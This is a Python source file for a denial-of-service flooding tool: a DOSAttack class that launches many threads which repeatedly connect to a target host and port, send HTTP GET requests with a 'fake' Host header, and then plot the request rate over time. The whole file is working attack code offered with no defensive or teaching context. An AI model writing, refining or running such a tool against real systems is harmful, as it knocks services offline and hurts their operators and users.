import socket
import threading
import time
import matplotlib.pyplot as plt
import os

class DOSAttack:
    def __init__(self, target, port, thread_count, fake_ip, duration):
        self.target = target
        self.port = port
        self.thread_count = thread_count
        self.fake_ip = fake_ip
        self.duration = duration
        self.packet_count = 0
        self.packet_history = []
        self.lock = threading.Lock()

    def attack(self):
        # Run attack until the specified duration
        end_time = time.time() + self.duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
                s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
                s.close()
                with self.lock:
                    self.packet_count += 1
            except Exception as e:
                with self.lock:
                    with open("dos_errors.log", "a") as log_file:
                        log_file.write(f"Thread error: {e}\n")

    def start_attack(self):
        threads = [threading.Thread(target=self.attack) for _ in range(self.thread_count)]
        for thread in threads:
            thread.start()

        # Collect packet counts every second
        start_time = time.time()
        while time.time() - start_time < self.duration:
            with self.lock:
                self.packet_history.append(self.packet_count)
                self.packet_count = 0
            time.sleep(1)

        for thread in threads:
            thread.join()

        self.plot_packets()

    def plot_packets(self):
        if not self.packet_history:  # Check if packet_history is empty
            print("No packets were sent, or packet counting failed.")
            return

        plt.figure()
        plt.plot(range(len(self.packet_history)), self.packet_history)
        plt.title('Packet Send Rate Over Time')
        plt.xlabel('Seconds')
        plt.ylabel('Packets per Second')
        plt.grid(True)

        timestamp = time.strftime("%d_%m_%H_%M", time.localtime())
        plot_path = os.path.join('Plots', f'plot({timestamp}).png')
        plt.savefig(plot_path)
        plt.close()
        print(f"Attack completed. Plot saved to {plot_path}")

